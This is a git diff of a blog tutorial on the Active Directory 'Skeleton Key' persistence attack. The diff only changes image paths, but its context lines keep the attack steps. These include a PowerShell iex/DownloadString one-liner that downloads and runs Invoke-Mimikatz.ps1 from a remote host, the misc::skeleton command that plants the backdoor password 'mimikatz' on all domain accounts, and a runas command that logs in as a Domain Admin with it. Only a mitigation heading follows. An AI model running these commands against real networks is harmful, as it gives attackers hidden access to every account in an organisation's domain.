@@ -19,31 +19,31 @@ I will do this attack from a Windows machine
 
 we need upload Mimikatz in windows machine you can use Mimikatz.exe or Mimikatz.ps1 but i use Mimikatz.ps1
 
-[![Image Alt Text](/assets/img/posts/Persistence/Skeleton Key/2024-02-14-1.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Persistence Skeleton Key/2024-02-14-1.png)](https://r00tven0m.github.io/)
 
 Now I will execute the Mimikatz tool using this command:
 
 ```powershell
  iex(New-Object Net.WebClient).DownloadString('http://192.168.56.1/Invoke-Mimikatz.ps1')
 ```
-[![Image Alt Text](/assets/img/posts/Persistence/Skeleton Key/2024-02-14-2.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Persistence Skeleton Key/2024-02-14-2.png)](https://r00tven0m.github.io/)
 After that, we execute  this command:
 
 ```powershell
 Invoke-Mimikatz -Command '"misc::skeleton"'
 ```
-[![Image Alt Text](/assets/img/posts/Persistence/Skeleton Key/2024-02-14-3.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Persistence Skeleton Key/2024-02-14-3.png)](https://r00tven0m.github.io/)
 
 Now, a password has been added to each user, which is "mimikatz", while ensuring the effectiveness of their previous passwords.
 Yes, with the Skeleton Key technique implemented, you can access a PowerShell session for the user `newadmin` for example, who is a member of the Domain Admins group, using the "mimikatz" password.
 
-[![Image Alt Text](/assets/img/posts/Persistence/Skeleton Key/2024-02-14-4.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Persistence Skeleton Key/2024-02-14-4.png)](https://r00tven0m.github.io/)
 
-[![Image Alt Text](/assets/img/posts/Persistence/Skeleton Key/2024-02-14-5.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Persistence Skeleton Key/2024-02-14-5.png)](https://r00tven0m.github.io/)
 
-[![Image Alt Text](/assets/img/posts/Persistence/Skeleton Key/2024-02-14-7.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Persistence Skeleton Key/2024-02-14-6.png)](https://r00tven0m.github.io/)
 
-[![Image Alt Text](/assets/img/posts/Persistence/Skeleton Key/2024-02-14-6.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Persistence Skeleton Key/2024-02-14-7.png)](https://r00tven0m.github.io/)
 
 If the Skeleton Key technique has been successfully applied and a backdoor password like `mimikatz` has been added to all user accounts in the Active Directory, including `newadmin`, then you can indeed use `runas` to execute a PowerShell session with the privileges of the `newadmin` user or any other user in the Active Directory.
 
@@ -55,7 +55,7 @@ runas /user:cbank\abdessalam.louhidi "powershell.exe"
 
 # Another Way if you need get ncat session 
 
-[![Image Alt Text](/assets/img/posts/Persistence/Skeleton Key/2024-02-14-8.png)](https://r00tven0m.github.io/)
+[![Image Alt Text](/assets/img/posts/Persistence Skeleton Key/2024-02-14-8.png)](https://r00tven0m.github.io/)
 
 # Some Mitigating Skeleton Key
 
